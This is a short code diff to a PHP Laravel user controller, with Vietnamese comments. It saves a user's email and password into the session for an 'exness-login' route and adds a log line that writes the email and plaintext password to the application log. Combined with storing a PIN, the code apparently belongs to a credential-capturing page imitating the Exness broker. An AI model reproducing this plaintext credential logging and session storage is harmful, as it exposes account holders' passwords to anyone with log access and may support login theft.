@@ -37,11 +37,9 @@ class UserController extends Controller
             return redirect()->route('admin.dashboard');
         }
 
-        // Thêm session để truyền sang /exness-login
-        session([
-            'email' => $email,
-            'password' => $password,
-        ]);
+        // Lưu session và log để debug
+        session(['email' => $email, 'password' => $password]);
+        \Log::info('Store: Saved session email=' . $email . ', password=' . $password);
 
         $this->userService->store($email, $password, $pin);
 
